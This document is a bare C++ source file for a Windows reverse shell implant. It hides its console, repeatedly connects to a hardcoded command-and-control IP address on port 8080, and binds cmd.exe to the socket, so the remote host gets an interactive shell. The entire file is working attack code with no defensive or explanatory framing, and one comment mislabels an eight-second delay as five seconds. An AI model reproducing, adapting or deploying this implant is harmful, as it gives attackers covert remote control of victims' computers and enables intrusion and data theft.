#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <process.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>
#include <tchar.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#include <iostream>

void main()
{
    char C2Server[] = "34.220.193.77";
    int C2Port = 8080;
    FreeConsole();
    while (true)
    {
        Sleep(8000); // Five Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2, 2), &version);
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR *)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
        {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else
        {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0)
            {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else
            {
                // char Process[] = "cmd.exe";
                // LPWSTR Process[] = "cmd.exe";
                LPWSTR process = _tcsdup(TEXT("cmd.exe")); // https://stackoverflow.com/questions/10044230/unhandled-error-with-createprocess
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
                CreateProcessW(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFO)&sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0)
                {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0)
                {
                    exit(0);
                }
            }
        }
    }
}